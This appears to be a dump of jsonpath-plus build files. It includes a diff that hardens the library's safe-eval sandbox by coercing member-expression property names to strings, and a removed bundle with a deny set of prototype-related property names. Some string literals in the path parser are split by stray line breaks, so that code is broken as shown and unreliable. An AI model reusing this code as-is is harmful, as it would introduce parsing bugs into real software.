t===a&&(e=!0);break;case\"integer\":!Number.isFinite(t)||t%1||(e=!0);break;case\"number\":Number.isFinite(t)&&(e=!0);break;case\"nonFinite\":\"number\"!=typeof t||Number.isFinite(t)||(e=!0);break;case\"object\":t&&typeof t===a&&(e=!0);break;case\"array\":Array.isArray(t)&&(e=!0);break;case\"other\":e=this.currOtherTypeCallback(t,r,s,n);break;case\"null\":null===t&&(e=!0);break;default:throw new TypeError(\"Unknown value type \"+a)}if(e)return h={path:r,value:t,parent:s,parentProperty:n},this._handleCallback(h,i,\"value\"),h}else if(\"`\"===p[0]&&t&&Object.hasOwn(t,p.slice(1))){const e=p.slice(1);f(this._trace(u,t[e],l(r,e),t,e,i,a,!0))}else if(p.includes(\",\")){const e=p.split(\",\");for(const a of e)f(this._trace(c(a,u),t,r,s,n,i,!0))}else!o&&t&&Object.hasOwn(t,p)&&f(this._trace(u,t[p],l(r,p),t,p,i,a,!0))}if(this._hasParentSelector)for(let e=0;e<d.length;e++){const r=d[e];if(r&&r.isParentSelector){const o=this._trace(r.expr,t,r.path,s,n,i,a);if(Array.isArray(o)){d[e]=o[0];const t=o.length;for(let r=1;r<t;r++)e++,d.splice(e,0,o[r])}else d[e]=o}}return d},u.prototype._walk=function(e,t){if(Array.isArray(e)){const r=e.length;for(let e=0;e<r;e++)t(e)}else e&&\"object\"==typeof e&&Object.keys(e).forEach((e=>{t(e)}))},u.prototype._slice=function(e,t,r,s,n,i,a){if(!Array.isArray(r))return;const o=r.length,h=e.split(\":\"),l=h[2]&&Number.parseInt(h[2])||1;let p=h[0]&&Number.parseInt(h[0])||0,u=h[1]&&Number.parseInt(h[1])||o;p=p<0?Math.max(0,p+o):Math.min(o,p),u=u<0?Math.max(0,u+o):Math.min(o,u);const d=[];for(let e=p;e<u;e+=l){this._trace(c(e,t),r,s,n,i,a,!0).forEach((e=>{d.push(e)}))}return d},u.prototype._eval=function(e,t,r,s,n,i){this.currSandbox._$_parentProperty=i,this.currSandbox._$_parent=n,this.currSandbox._$_property=r,this.currSandbox._$_root=this.json,this.currSandbox._$_v=t;const a=e.includes(\"@path\");a&&(this.currSandbox._$_path=u.toPathString(s.concat([r])));const o=this.currEval+\"Script:\"+e;if(!u.cache[o]){let t=e.replaceAll(\"@parentProperty\",\"_$_parentProperty\").replaceAll(\"@parent\",\"_$_parent\").replaceAll(\"@property\",\"_$_property\").replaceAll(\"@root\",\"_$_root\").replaceAll(/@([.\\s)[])/gu,\"_$_v$1\");if(a&&(t=t.replaceAll(\"@path\",\"_$_path\")),\"safe\"===this.currEval||!0===this.currEval||void 0===this.currEval)u.cache[o]=new this.safeVm.Script(t);else if(\"native\"===this.currEval)u.cache[o]=new this.vm.Script(t);else if(\"function\"==typeof this.currEval&&this.currEval.prototype&&Object.hasOwn(this.currEval.prototype,\"runInNewContext\")){const e=this.currEval;u.cache[o]=new e(t)}else{if(\"function\"!=typeof this.currEval)throw new TypeError(`Unknown \"eval\" property \"${this.currEval}\"`);u.cache[o]={runInNewContext:e=>this.currEval(t,e)}}}try{return u.cache[o].runInNewContext(this.currSandbox)}catch(t){if(this.ignoreEvalErrors)return!1;throw new Error(\"jsonPath: \"+t.message+\": \"+e)}},u.cache={},u.toPathString=function(e){const t=e,r=t.length;let s=\"$\";for(let e=1;e<r;e++)/^(~|\\^|@.*?\\(\\))$/u.test(t[e])||(s+=/^[0-9*]+$/u.test(t[e])?\"[\"+t[e]+\"]\":\"['\"+t[e]+\"']\");return s},u.toPointer=function(e){const t=e,r=t.length;let s=\"\";for(let e=1;e<r;e++)/^(~|\\^|@.*?\\(\\))$/u.test(t[e])||(s+=\"/\"+t[e].toString().replaceAll(\"~\",\"~0\").replaceAll(\"/\",\"~1\"));return s},u.toPathArray=function(e){const{cache:t}=u;if(t[e])return t[e].concat();const r=[],s=e.replaceAll(/@(?:null|boolean|number|string|integer|undefined|nonFinite|scalar|array|object|function|other)\\(\\)/gu,\";$&;\").replaceAll(/[['](\\??\\(.*?\\))[\\]'](?!.\\])/gu,(function(e,t){return\"[#\"+(r.push(t)-1)+\"]\"})).replaceAll(/\\[['\"]([^'\\]]*)['\"]\\]/gu,(function(e,t){return\"['\"+t.replaceAll(\".\",\"%@%\").replaceAll(\"~\",\"%%\n\n@@%%\")+\"']\"})).replaceAll(\"~\",\";~;\").replaceAll(/['\"]?\\.['\"]?(?![^[]*\\])|\\[['\"]?/gu,\";\").replaceAll(\"%@%\",\".\").replaceAll(\"%%@@\n%%\",\"~\").replaceAll(/(?:;)?(\\^+)(?:;)?/gu,(function(e,t){return\";\"+t.split(\"\").join(\";\")+\";\"})).replaceAll(/;;;|;;/gu,\";..;\").replaceAll(/;$|'?\\]|'$/gu,\"\").split(\";\").map((function(e){const t=e.match(/#(\\d+)/u);return t&&t[1]?r[t[1]]:e}));return t[e]=s,t[e].concat()},u.prototype.safeVm={Script:class{constructor(e){this.code=e,this.ast=r(this.code)}runInNewContext(e){const t=Object.assign(Object.create(null),e);return h.evalAst(this.ast,t)}}};u.prototype.vm={Script:class{constructor(e){this.code=e}runInNewContext(e){let t=this.code;const r=Object.keys(e),s=[];!function(e,t,r){const s=e.length;for(let n=0;n<s;n++)r(e[n])&&t.push(e.splice(n--,1)[0])}(r,s,(t=>\"function\"==typeof e[t]));const n=r.map((t=>e[t]));t=s.reduce(((t,r)=>{let s=e[r].toString();return/function/u.test(s)||(s=\"function \"+s),\"var \"+r+\"=\"+s+\";\"+t}),\"\")+t,/(['\"])use strict\\1/u.test(t)||r.includes(\"arguments\")||(t=\"var arguments = undefined;\"+t),t=t.replace(/;\\s*$/u,\"\");const i=t.lastIndexOf(\";\"),a=-1!==i?t.slice(0,i+1)+\" return \"+t.slice(i+1):\" return \"+t;return new Function(...r,a)(...n)}}};export{u as JSONPath};\n //# sourceMappingURL=index-browser-esm.min.js.map\n```\n\nFilename: dist/index-browser-esm.min.js.map:\n```\n\n```\n\nFilename: dist/index-browser-umd.cjs:\n```\n@@ -1303,8 +1303,13 @@\nreturn ast.value;\n \t  },\n \t  evalMemberExpression(ast, subs) {\n-\t    const prop = ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`\n-\t    : ast.property.name; // `object.property` property is Identifier\n+\t    const prop = String(\n+\t    // NOTE: `String(value)` throws error when\n+\t    // value has overwritten the toString method to return non-string\n+\t    // i.e. `value = {toString: () => []}`\n+\t    ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`\n+\t    : ast.property.name // `object.property` property is Identifier\n+\t    );\n \t    const obj = SafeEval.evalAst(ast.object, subs);\n \t    if (obj === undefined || obj === null) {\n \t      throw TypeError(`Cannot read properties of ${obj} (reading '${prop}')`);\n```\n\nFilename: dist/index-browser-umd.min.cjs:\n```\n@@ -1,2 +1,2 @@\n-!function(e,t){\"object\"==typeof exports&&\"undefined\"!=typeof module?t(exports):\"function\"==typeof define&&define.amd?define([\"exports\"],t):t((e=\"undefined\"!=typeof globalThis?globalThis:e||self).JSONPath={})}(this,(function(e){\"use strict\";class t{static get version(){return\"1.4.0\"}static toString(){return\"JavaScript Expression Parser (JSEP) v\"+t.version}static addUnaryOp(e){return t.max_unop_len=Math.max(e.length,t.max_unop_len),t.unary_ops[e]=1,t}static addBinaryOp(e,r,s){return t.max_binop_len=Math.max(e.length,t.max_binop_len),t.binary_ops[e]=r,s?t.right_associative.add(e):t.right_associative.delete(e),t}static addIdentifierChar(e){return t.additional_identifier_chars.add(e),t}static addLiteral(e,r){return t.literals[e]=r,t}static removeUnaryOp(e){return delete t.unary_ops[e],e.length===t.max_unop_len&&(t.max_unop_len=t.getMaxKeyLen(t.unary_ops)),t}static removeAllUnaryOps(){return t.unary_ops={},t.max_unop_len=0,t}static removeIdentifierChar(e){return t.additional_identifier_chars.delete(e),t}static removeBinaryOp(e){return delete t.binary_ops[e],e.length===t.max_binop_len&&(t.max_binop_len=t.getMaxKeyLen(t.binary_ops)),t.right_associative.delete(e),t}static removeAllBinaryOps(){return t.binary_ops={},t.max_binop_len=0,t}static removeLiteral(e){return delete t.literals[e],t}static removeAllLiterals(){return t.literals={},t}get char(){return this.expr.charAt(this.index)}get code(){return this.expr.charCodeAt(this.index)}constructor(e){this.expr=e,this.index=0}static parse(e){return new t(e).parse()}static getMaxKeyLen(e){return Math.max(0,...Object.keys(e).map((e=>e.length)))}static isDecimalDigit(e){return e>=48&&e<=57}static binaryPrecedence(e){return t.binary_ops[e]||0}static isIdentifierStart(e){return e>=65&&e<=90||e>=97&&e<=122||e>=128&&!t.binary_ops[String.fromCharCode(e)]||t.additional_identifier_chars.has(String.fromCharCode(e))}static isIdentifierPart(e){return t.isIdentifierStart(e)||t.isDecimalDigit(e)}throwError(e){const t=new Error(e+\" at character \"+this.index);throw t.index=this.index,t.description=e,t}runHook(e,r){if(t.hooks[e]){const s={context:this,node:r};return t.hooks.run(e,s),s.node}return r}searchHook(e){if(t.hooks[e]){const r={context:this};return t.hooks[e].find((function(e){return e.call(r.context,r),r.node})),r.node}}gobbleSpaces(){let e=this.code;for(;e===t.SPACE_CODE||e===t.TAB_CODE||e===t.LF_CODE||e===t.CR_CODE;)e=this.expr.charCodeAt(++this.index);this.runHook(\"gobble-spaces\")}parse(){this.runHook(\"before-all\");const e=this.gobbleExpressions(),r=1===e.length?e[0]:{type:t.COMPOUND,body:e};return this.runHook(\"after-all\",r)}gobbleExpressions(e){let r,s,n=[];for(;this.index<this.expr.length;)if(r=this.code,r===t.SEMCOL_CODE||r===t.COMMA_CODE)this.index++;else if(s=this.gobbleExpression())n.push(s);else if(this.index<this.expr.length){if(r===e)break;this.throwError('Unexpected \"'+this.char+'\"')}return n}gobbleExpression(){const e=this.searchHook(\"gobble-expression\")||this.gobbleBinaryExpression();return this.gobbleSpaces(),this.runHook(\"after-expression\",e)}gobbleBinaryOp(){this.gobbleSpaces();let e=this.expr.substr(this.index,t.max_binop_len),r=e.length;for(;r>0;){if(t.binary_ops.hasOwnProperty(e)&&(!t.isIdentifierStart(this.code)||this.index+e.length<this.expr.length&&!t.isIdentifierPart(this.expr.charCodeAt(this.index+e.length))))return this.index+=r,e;e=e.substr(0,--r)}return!1}gobbleBinaryExpression(){let e,r,s,n,i,o,a,h,l;if(o=this.gobbleToken(),!o)return o;if(r=this.gobbleBinaryOp(),!r)return o;for(i={value:r,prec:t.binaryPrecedence(r),right_a:t.right_associative.has(r)},a=this.gobbleToken(),a||this.throwError(\"Expected expression after \"+r),n=[o,i,a];r=this.gobbleBinaryOp();){if(s=t.binaryPrecedence(r),0===s){this.index-=r.length;break}i={value:r,prec:s,right_a:t.right_associative.has(r)},l=r;const h=e=>i.right_a&&e.right_a?s>e.prec:s<=e.prec;for(;n.length>2&&h(n[n.length-2]);)a=n.pop(),r=n.pop().value,o=n.pop(),e={type:t.BINARY_EXP,operator:r,left:o,right:a},n.push(e);e=this.gobbleToken(),e||this.throwError(\"Expected expression after \"+l),n.push(i,e)}for(h=n.length-1,e=n[h];h>1;)e={type:t.BINARY_EXP,operator:n[h-1].value,left:n[h-2],right:e},h-=2;return e}gobbleToken(){let e,r,s,n;if(this.gobbleSpaces(),n=this.searchHook(\"gobble-token\"),n)return this.runHook(\"after-token\",n);if(e=this.code,t.isDecimalDigit(e)||e===t.PERIOD_CODE)return this.gobbleNumericLiteral();if(e===t.SQUOTE_CODE||e===t.DQUOTE_CODE)n=this.gobbleStringLiteral();else if(e===t.OBRACK_CODE)n=this.gobbleArray();else{for(r=this.expr.substr(this.index,t.max_unop_len),s=r.length;s>0;){if(t.unary_ops.hasOwnProperty(r)&&(!t.isIdentifierStart(this.code)||this.index+r.length<this.expr.length&&!t.isIdentifierPart(this.expr.charCodeAt(this.index+r.length)))){this.index+=s;const e=this.gobbleToken();return e||this.throwError(\"missing unaryOp argument\"),this.runHook(\"after-token\",{type:t.UNARY_EXP,operator:r,argument:e,prefix:!0})}r=r.substr(0,--s)}t.isIdentifierStart(e)?(n=this.gobbleIdentifier(),t.literals.hasOwnProperty(n.name)?n={type:t.LITERAL,value:t.literals[n.name],raw:n.name}:n.name===t.this_str&&(n={type:t.THIS_EXP})):e===t.OPAREN_CODE&&(n=this.gobbleGroup())}return n?(n=this.gobbleTokenProperty(n),this.runHook(\"after-token\",n)):this.runHook(\"after-token\",!1)}gobbleTokenProperty(e){this.gobbleSpaces();let r=this.code;for(;r===t.PERIOD_CODE||r===t.OBRACK_CODE||r===t.OPAREN_CODE||r===t.QUMARK_CODE;){let s;if(r===t.QUMARK_CODE){if(this.expr.charCodeAt(this.index+1)!==t.PERIOD_CODE)break;s=!0,this.index+=2,this.gobbleSpaces(),r=this.code}this.index++,r===t.OBRACK_CODE?((e={type:t.MEMBER_EXP,computed:!0,object:e,property:this.gobbleExpression()}).property||this.throwError('Unexpected \"'+this.char+'\"'),this.gobbleSpaces(),r=this.code,r!==t.CBRACK_CODE&&this.throwError(\"Unclosed [\"),this.index++):r===t.OPAREN_CODE?e={type:t.CALL_EXP,arguments:this.gobbleArguments(t.CPAREN_CODE),callee:e}:(r===t.PERIOD_CODE||s)&&(s&&this.index--,this.gobbleSpaces(),e={type:t.MEMBER_EXP,computed:!1,object:e,property:this.gobbleIdentifier()}),s&&(e.optional=!0),this.gobbleSpaces(),r=this.code}return e}gobbleNumericLiteral(){let e,r,s=\"\";for(;t.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);if(this.code===t.PERIOD_CODE)for(s+=this.expr.charAt(this.index++);t.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);if(e=this.char,\"e\"===e||\"E\"===e){for(s+=this.expr.charAt(this.index++),e=this.char,\"+\"!==e&&\"-\"!==e||(s+=this.expr.charAt(this.index++));t.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);t.isDecimalDigit(this.expr.charCodeAt(this.index-1))||this.throwError(\"Expected exponent (\"+s+this.char+\")\")}return r=this.code,t.isIdentifierStart(r)?this.throwError(\"Variable names cannot start with a number (\"+s+this.char+\")\"):(r===t.PERIOD_CODE||1===s.length&&s.charCodeAt(0)===t.PERIOD_CODE)&&this.throwError(\"Unexpected period\"),{type:t.LITERAL,value:parseFloat(s),raw:s}}gobbleStringLiteral(){let e=\"\";const r=this.index,s=this.expr.charAt(this.index++);let n=!1;for(;this.index<this.expr.length;){let t=this.expr.charAt(this.index++);if(t===s){n=!0;break}if(\"\\\\\"===t)switch(t=this.expr.charAt(this.index++),t){case\"n\":e+=\"\\n\";break;case\"r\":e+=\"\\r\";break;case\"t\":e+=\"\\t\";break;case\"b\":e+=\"\\b\";break;case\"f\":e+=\"\\f\";break;case\"v\":e+=\"\\v\";break;default:e+=t}else e+=t}return n||this.throwError('Unclosed quote after \"'+e+'\"'),{type:t.LITERAL,value:e,raw:this.expr.substring(r,this.index)}}gobbleIdentifier(){let e=this.code,r=this.index;for(t.isIdentifierStart(e)?this.index++:this.throwError(\"Unexpected \"+this.char);this.index<this.expr.length&&(e=this.code,t.isIdentifierPart(e));)this.index++;return{type:t.IDENTIFIER,name:this.expr.slice(r,this.index)}}gobbleArguments(e){const r=[];let s=!1,n=0;for(;this.index<this.expr.length;){this.gobbleSpaces();let i=this.code;if(i===e){s=!0,this.index++,e===t.CPAREN_CODE&&n&&n>=r.length&&this.throwError(\"Unexpected token \"+String.fromCharCode(e));break}if(i===t.COMMA_CODE){if(this.index++,n++,n!==r.length)if(e===t.CPAREN_CODE)this.throwError(\"Unexpected token ,\");else if(e===t.CBRACK_CODE)for(let e=r.length;e<n;e++)r.push(null)}else if(r.length!==n&&0!==n)this.throwError(\"Expected comma\");else{const e=this.gobbleExpression();e&&e.type!==t.COMPOUND||this.throwError(\"Expected comma\"),r.push(e)}}return s||this.throwError(\"Expected \"+String.fromCharCode(e)),r}gobbleGroup(){this.index++;let e=this.gobbleExpressions(t.CPAREN_CODE);if(this.code===t.CPAREN_CODE)return this.index++,1===e.length?e[0]:!!e.length&&{type:t.SEQUENCE_EXP,expressions:e};this.throwError(\"Unclosed (\")}gobbleArray(){return this.index++,{type:t.ARRAY_EXP,elements:this.gobbleArguments(t.CBRACK_CODE)}}}const r=new class{add(e,t,r){if(\"string\"!=typeof arguments[0])for(let e in arguments[0])this.add(e,arguments[0][e],arguments[1]);else(Array.isArray(e)?e:[e]).forEach((function(e){this[e]=this[e]||[],t&&this[e][r?\"unshift\":\"push\"](t)}),this)}run(e,t){this[e]=this[e]||[],this[e].forEach((function(e){e.call(t&&t.context?t.context:t,t)}))}};Object.assign(t,{hooks:r,plugins:new class{constructor(e){this.jsep=e,this.registered={}}register(){for(var e=arguments.length,t=new Array(e),r=0;r<e;r++)t[r]=arguments[r];t.forEach((e=>{if(\"object\"!=typeof e||!e.name||!e.init)throw new Error(\"Invalid JSEP plugin format\");this.registered[e.name]||(e.init(this.jsep),this.registered[e.name]=e)}))}}(t),COMPOUND:\"Compound\",SEQUENCE_EXP:\"SequenceExpression\",IDENTIFIER:\"Identifier\",MEMBER_EXP:\"MemberExpression\",LITERAL:\"Literal\",THIS_EXP:\"ThisExpression\",CALL_EXP:\"CallExpression\",UNARY_EXP:\"UnaryExpression\",BINARY_EXP:\"BinaryExpression\",ARRAY_EXP:\"ArrayExpression\",TAB_CODE:9,LF_CODE:10,CR_CODE:13,SPACE_CODE:32,PERIOD_CODE:46,COMMA_CODE:44,SQUOTE_CODE:39,DQUOTE_CODE:34,OPAREN_CODE:40,CPAREN_CODE:41,OBRACK_CODE:91,CBRACK_CODE:93,QUMARK_CODE:63,SEMCOL_CODE:59,COLON_CODE:58,unary_ops:{\"-\":1,\"!\":1,\"~\":1,\"+\":1},binary_ops:{\"||\":1,\"??\":1,\"&&\":2,\"|\":3,\"^\":4,\"&\":5,\"==\":6,\"!=\":6,\"===\":6,\"!==\":6,\"<\":7,\">\":7,\"<=\":7,\">=\":7,\"<<\":8,\">>\":8,\">>>\":8,\"+\":9,\"-\":9,\"*\":10,\"/\":10,\"%\":10,\"**\":11},right_associative:new Set([\"**\"]),additional_identifier_chars:new Set([\"$\",\"_\"]),literals:{true:!0,false:!1,null:null},this_str:\"this\"}),t.max_unop_len=t.getMaxKeyLen(t.unary_ops),t.max_binop_len=t.getMaxKeyLen(t.binary_ops);const s=e=>new t(e).parse(),n=Object.getOwnPropertyNames(class{});Object.getOwnPropertyNames(t).filter((e=>!n.includes(e)&&void 0===s[e])).forEach((e=>{s[e]=t[e]})),s.Jsep=t;var i={name:\"ternary\",init(e){e.hooks.add(\"after-expression\",(function(t){if(t.node&&this.code===e.QUMARK_CODE){this.index++;const r=t.node,s=this.gobbleExpression();if(s||this.throwError(\"Expected expression\"),this.gobbleSpaces(),this.code===e.COLON_CODE){this.index++;const n=this.gobbleExpression();if(n||this.throwError(\"Expected expression\"),t.node={type:\"ConditionalExpression\",test:r,consequent:s,alternate:n},r.operator&&e.binary_ops[r.operator]<=.9){let s=r;for(;s.right.operator&&e.binary_ops[s.right.operator]<=.9;)s=s.right;t.node.test=s.right,s.right=t.node,t.node=r}}else this.throwError(\"Expected :\")}}))}};s.plugins.register(i);var o={name:\"regex\",init(e){e.hooks.add(\"gobble-token\",(function(t){if(47===this.code){const r=++this.index;let s=!1;for(;this.index<this.expr.length;){if(47===this.code&&!s){const s=this.expr.slice(r,this.index);let n,i=\"\";for(;++this.index<this.expr.length;){const e=this.code;if(!(e>=97&&e<=122||e>=65&&e<=90||e>=48&&e<=57))break;i+=this.char}try{n=new RegExp(s,i)}catch(e){this.throwError(e.message)}return t.node={type:e.LITERAL,value:n,raw:this.expr.slice(r-1,this.index)},t.node=this.gobbleTokenProperty(t.node),t.node}this.code===e.OBRACK_CODE?s=!0:s&&this.code===e.CBRACK_CODE&&(s=!1),this.index+=92===this.code?2:1}this.throwError(\"Unclosed Regex\")}}))}};const a={name:\"assignment\",assignmentOperators:new Set([\"=\",\"*=\",\"**=\",\"/=\",\"%=\",\"+=\",\"-=\",\"<<=\",\">>=\",\">>>=\",\"&=\",\"^=\",\"|=\",\"||=\",\"&&=\",\"??=\"]),updateOperators:[43,45],assignmentPrecedence:.9,init(e){const t=[e.IDENTIFIER,e.MEMBER_EXP];function r(e){a.assignmentOperators.has(e.operator)?(e.type=\"AssignmentExpression\",r(e.left),r(e.right)):e.operator||Object.values(e).forEach((e=>{e&&\"object\"==typeof e&&r(e)}))}a.assignmentOperators.forEach((t=>e.addBinaryOp(t,a.assignmentPrecedence,!0))),e.hooks.add(\"gobble-token\",(function(e){const r=this.code;a.updateOperators.some((e=>e===r&&e===this.expr.charCodeAt(this.index+1)))&&(this.index+=2,e.node={type:\"UpdateExpression\",operator:43===r?\"++\":\"--\",argument:this.gobbleTokenProperty(this.gobbleIdentifier()),prefix:!0},e.node.argument&&t.includes(e.node.argument.type)||this.throwError(`Unexpected ${e.node.operator}`))})),e.hooks.add(\"after-token\",(function(e){if(e.node){const r=this.code;a.updateOperators.some((e=>e===r&&e===this.expr.charCodeAt(this.index+1)))&&(t.includes(e.node.type)||this.throwError(`Unexpected ${e.node.operator}`),this.index+=2,e.node={type:\"UpdateExpression\",operator:43===r?\"++\":\"--\",argument:e.node,prefix:!1})}})),e.hooks.add(\"after-expression\",(function(e){e.node&&r(e.node)}))}};s.plugins.register(o,a),s.addUnaryOp(\"typeof\"),s.addLiteral(\"null\",null),s.addLiteral(\"undefined\",void 0);const h=new Set([\"constructor\",\"__proto__\",\"__defineGetter__\",\"__defineSetter__\"]),l={evalAst(e,t){switch(e.type){case\"BinaryExpression\":case\"LogicalExpression\":return l.evalBinaryExpression(e,t);case\"Compound\":return l.evalCompound(e,t);case\"ConditionalExpression\":return l.evalConditionalExpression(e,t);case\"Identifier\":return l.evalIdentifier(e,t);case\"Literal\":return l.evalLiteral(e,t);case\"MemberExpression\":return l.evalMemberExpression(e,t);case\"UnaryExpression\":return l.evalUnaryExpression(e,t);case\"ArrayExpression\":return l.evalArrayExpression(e,t);case\"CallExpression\":return l.evalCallExpression(e,t);case\"AssignmentExpression\":return l.evalAssignmentExpression(e,t);default:throw SyntaxError(\"Unexpected expression\",e)}},evalBinaryExpression:(e,t)=>({\"||\":(e,t)=>e||t(),\"&&\":(e,t)=>e&&t(),\"|\":(e,t)=>e|t(),\"^\":(e,t)=>e^t(),\"&\":(e,t)=>e&t(),\"==\":(e,t)=>e==t(),\"!=\":(e,t)=>e!=t(),\"===\":(e,t)=>e===t(),\"!==\":(e,t)=>e!==t(),\"<\":(e,t)=>e<t(),\">\":(e,t)=>e>t(),\"<=\":(e,t)=>e<=t(),\">=\":(e,t)=>e>=t(),\"<<\":(e,t)=>e<<t(),\">>\":(e,t)=>e>>t(),\">>>\":(e,t)=>e>>>t(),\"+\":(e,t)=>e+t(),\"-\":(e,t)=>e-t(),\"*\":(e,t)=>e*t(),\"/\":(e,t)=>e/t(),\"%\":(e,t)=>e%t()}[e.operator](l.evalAst(e.left,t),(()=>l.evalAst(e.right,t)))),evalCompound(e,t){let r;for(let s=0;s<e.body.length;s++){\"Identifier\"===e.body[s].type&&[\"var\",\"let\",\"const\"].includes(e.body[s].name)&&e.body[s+1]&&\"AssignmentExpression\"===e.body[s+1].type&&(s+=1);const n=e.body[s];r=l.evalAst(n,t)}return r},evalConditionalExpression:(e,t)=>l.evalAst(e.test,t)?l.evalAst(e.consequent,t):l.evalAst(e.alternate,t),evalIdentifier(e,t){if(Object.hasOwn(t,e.name))return t[e.name];throw ReferenceError(`${e.name} is not defined`)},evalLiteral:e=>e.value,evalMemberExpression(e,t){const r=e.computed?l.evalAst(e.property):e.property.name,s=l.evalAst(e.object,t);if(null==s)throw TypeError(`Cannot read properties of ${s} (reading '${r}')`);if(!Object.hasOwn(s,r)&&h.has(r))throw TypeError(`Cannot read properties of ${s} (reading '${r}')`);const n=s[r];return\"function\"==typeof n?n.bind(s):n},evalUnaryExpression:(e,t)=>({\"-\":e=>-l.evalAst(e,t),\"!\":e=>!l.evalAst(e,t),\"~\":e=>~l.evalAst(e,t),\"+\":e=>+l.evalAst(e,t),typeof:e=>typeof l.evalAst(e,t)}[e.operator](e.argument)),evalArrayExpression:(e,t)=>e.elements.map((e=>l.evalAst(e,t))),evalCallExpression(e,t){const r=e.arguments.map((e=>l.evalAst(e,t)));return l.evalAst(e.callee,t)(...r)},evalAssignmentExpression(e,t){if(\"Identifier\"!==e.left.type)throw SyntaxError(\"Invalid left-hand side in assignment\");const r=e.left.name,s=l.evalAst(e.right,t);return t[r]=s,t[r]}};function c(e,t){return(e=e.slice()).push(t),e}function p(e,t){return(t=t.slice()).unshift(e),t}class u extends Error{constructor(e){super('JSONPath should not be called with \"new\" (it prevents return of (unwrapped) scalar values)'),this.avoidNew=!0,this.value=e,this.name=\"NewError\"}}function d(e,t,r,s,n){if(!(this instanceof d))try{return new d(e,t,r,s,n)}catch(e){if(!e.avoidNew)throw e;return e.value}\"string\"==typeof e&&(n=s,s=r,r=t,t=e,e=null);const i=e&&\"object\"==typeof e;if(e=e||{},this.json=e.json||r,this.path=e.path||t,this.resultType=e.resultType||\"value\",this.flatten=e.flatten||!1,this.wrap=!Object.hasOwn(e,\"wrap\")||e.wrap,this.sandbox=e.sandbox||{},this.eval=void 0===e.eval?\"safe\":e.eval,this.ignoreEvalErrors=void 0!==e.ignoreEvalErrors&&e.ignoreEvalErrors,this.parent=e.parent||null,this.parentProperty=e.parentProperty||null,this.callback=e.callback||s||null,this.otherTypeCallback=e.otherTypeCallback||n||function(){throw new TypeError(\"You must supply an otherTypeCallback callback option with the @other() operator.\")},!1!==e.autostart){const s={path:i?e.path:t};i?\"json\"in e&&(s.json=e.json):s.json=r;const n=this.evaluate(s);if(!n||\"object\"!=typeof n)throw new u(n);return n}}d.prototype.evaluate=function(e,t,r,s){let n=this.parent,i=this.parentProperty,{flatten:o,wrap:a}=this;if(this.currResultType=this.resultType,this.currEval=this.eval,this.currSandbox=this.sandbox,r=r||this.callback,this.currOtherTypeCallback=s||this.otherTypeCallback,t=t||this.json,(e=e||this.path)&&\"object\"==typeof e&&!Array.isArray(e)){if(!e.path&&\"\"!==e.path)throw new TypeError('You must supply a \"path\" property when providing an object argument to JSONPath.evaluate().');if(!Object.hasOwn(e,\"json\"))throw new TypeError('You must supply a \"json\" property when providing an object argument to JSONPath.evaluate().');({json:t}=e),o=Object.hasOwn(e,\"flatten\")?e.flatten:o,this.currResultType=Object.hasOwn(e,\"resultType\")?e.resultType:this.currResultType,this.currSandbox=Object.hasOwn(e,\"sandbox\")?e.sandbox:this.currSandbox,a=Object.hasOwn(e,\"wrap\")?e.wrap:a,this.currEval=Object.hasOwn(e,\"eval\")?e.eval:this.currEval,r=Object.hasOwn(e,\"callback\")?e.callback:r,this.currOtherTypeCallback=Object.hasOwn(e,\"otherTypeCallback\")?e.otherTypeCallback:this.currOtherTypeCallback,n=Object.hasOwn(e,\"parent\")?e.parent:n,i=Object.hasOwn(e,\"parentProperty\")?e.parentProperty:i,e=e.path}if(n=n||null,i=i||null,Array.isArray(e)&&(e=d.toPathString(e)),!e&&\"\"!==e||!t)return;const h=d.toPathArray(e);\"$\"===h[0]&&h.length>1&&h.shift(),this._hasParentSelector=null;const l=this._trace(h,t,[\"$\"],n,i,r).filter((function(e){return e&&!e.isParentSelector}));return l.length?a||1!==l.length||l[0].hasArrExpr?l.reduce(((e,t)=>{const r=this._getPreferredOutput(t);return o&&Array.isArray(r)?e=e.concat(r):e.push(r),e}),[]):this._getPreferredOutput(l[0]):a?[]:void 0},d.prototype._getPreferredOutput=function(e){const t=this.currResultType;switch(t){case\"all\":{const t=Array.isArray(e.path)?e.path:d.toPathArray(e.path);return e.pointer=d.toPointer(t),e.path=\"string\"==typeof e.path?e.path:d.toPathString(e.path),e}case\"value\":case\"parent\":case\"parentProperty\":return e[t];case\"path\":return d.toPathString(e[t]);case\"pointer\":return d.toPointer(e.path);default:throw new TypeError(\"Unknown result type\")}},d.prototype._handleCallback=function(e,t,r){if(t){const s=this._getPreferredOutput(e);e.path=\"string\"==typeof e.path?e.path:d.toPathString(e.path),t(s,r,e)}},d.prototype._trace=function(e,t,r,s,n,i,o,a){let h;if(!e.length)return h={path:r,value:t,parent:s,parentProperty:n,hasArrExpr:o},this._handleCallback(h,i,\"value\"),h;const l=e[0],u=e.slice(1),d=[];function f(e){Array.isArray(e)?e.forEach((e=>{d.push(e)})):d.push(e)}if((\"string\"!=typeof l||a)&&t&&Object.hasOwn(t,l))f(this._trace(u,t[l],c(r,l),t,l,i,o));else if(\"*\"===l)this._walk(t,(e=>{f(this._trace(u,t[e],c(r,e),t,e,i,!0,!0))}));else if(\"..\"===l)f(this._trace(u,t,r,s,n,i,o)),this._walk(t,(s=>{\"object\"==typeof t[s]&&f(this._trace(e.slice(),t[s],c(r,s),t,s,i,!0))}));else{if(\"^\"===l)return this._hasParentSelector=!0,{path:r.slice(0,-1),expr:u,isParentSelector:!0};if(\"~\"===l)return h={path:c(r,l),value:n,parent:s,parentProperty:null},this._handleCallback(h,i,\"property\"),h;if(\"$\"===l)f(this._trace(u,t,r,null,null,i,o));else if(/^(-?\\d*):(-?\\d*):?(\\d*)$/u.test(l))f(this._slice(l,u,t,r,s,n,i));else if(0===l.indexOf(\"?(\")){if(!1===this.currEval)throw new Error(\"Eval [?(expr)] prevented in JSONPath expression.\");const e=l.replace(/^\\?\\((.*?)\\)$/u,\"$1\"),o=/@.?([^?]*)[['](\\??\\(.*?\\))(?!.\\)\\])[\\]']/gu.exec(e);o?this._walk(t,(e=>{const a=[o[2]],h=o[1]?t[e][o[1]]:t[e];this._trace(a,h,r,s,n,i,!0).length>0&&f(this._trace(u,t[e],c(r,e),t,e,i,!0))})):this._walk(t,(o=>{this._eval(e,t[o],o,r,s,n)&&f(this._trace(u,t[o],c(r,o),t,o,i,!0))}))}else 